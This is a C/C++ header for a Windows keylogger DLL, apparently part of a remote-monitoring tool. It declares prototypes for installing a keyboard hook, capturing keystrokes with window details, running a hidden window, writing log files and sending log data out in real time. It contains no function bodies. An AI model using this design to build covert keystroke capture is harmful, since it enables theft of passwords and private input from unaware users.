#ifndef _KEY_LOG_H_
#define _KEY_LOG_H_

#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <memory.h>
#include <Psapi.h>		// GetModuleFileNameEx()
#include <shlwapi.h>	// StrStrI()
#include "RMDefs.h"
#include "DataStructures.h"

#define UP					1
#define DOWN				0


//** FUNCTION PROTOTYPES **//

// 1 **************** KL Hook DLL *******************

    //* DLLMain
extern "C" 	__declspec(dllexport)BOOL	InstallKLHook(WCHAR *CPMDirectory);
extern "C" 	__declspec(dllexport)BOOL	RemoveKLHook();

LRESULT	CALLBACK KLGetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);

BOOL	InitProcess();
BOOL	NeverHookThisProcess();
BOOL	ReadKLConfig();

//* ProcessKey
BOOL	ProcessKey(BOOL Type, HWND hKey, WPARAM wParam, LPARAM lParam);

//* KLTempLinkList
BOOL	BuildTempLinkList(HWND hWnd, WCHAR *KeyPressed);
BOOL	QueryHandleHierarchy(HWND hWnd, KLTEMPDATA *pKLTempData);
BOOL	FillKLWindowData(KLTEMPDATA *pKLTempData);
BOOL	AddNewNode(KLTEMPDATA *pKLTempData);

//* ReadKLConfig
DWORD WINAPI ReadNewKLConfiguration(LPVOID lpParam);
BOOL ConfigureAppFilter();

//* DataTransfer
DWORD WINAPI TransferLinkListData(LPVOID lParam);
BOOL StartTransfer();


// 2 ******************** KLIF ****************************

    //* DLLMain - Main Thread

typedef BOOL(__cdecl *INSTALLPROC)(WCHAR *pszKLDir);
typedef BOOL(__cdecl *REMOVEPROC)();

extern "C" 	__declspec(dllexport)BOOL	ProcessCmd(RM_COMMAND Cmd, MNTRDATA *MNTRData, PDATA __out **pPData);

BOOL			SetSleepTimerVal(RM_COMMAND Cmd);

BOOL			GetNextDate(WORD *pDate, WORD *pMonth, WORD *pYear);
BOOL			RetrieveLogFiles(const WCHAR *wszDirPath, const SYSTEMTIME *stFromDate, const SYSTEMTIME *stToDate, FILE_TRANSFER_DATA *pLogFilesList);

//* HiddenWindow Thread

DWORD	WINAPI	CreateHiddenWindow(HINSTANCE hInstance);
LRESULT	WINAPI	WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
BOOL			CopyofWMCopyData(KLTEMPDATA *pCopyData);
BOOL			BuildKLTree(KLTEMPDATA *pTempStruct);
BOOL			FillKLTreeData(KLIFLINKLIST *pNewNode, KLTEMPDATA *TempStruct);

//* SleepTimer Thread

DWORD	WINAPI	SleepTimer();

//* UpdateLogFile Thread

DWORD	WINAPI	UpdateLogFile();
BOOL			CopyTreeData();
BOOL			WriteToLogFile(LOGFILEDATA *pTempLogFileStruct);
BOOL			SendRealTimeData(LOGFILEDATA *pTempLogFileData);

#endif
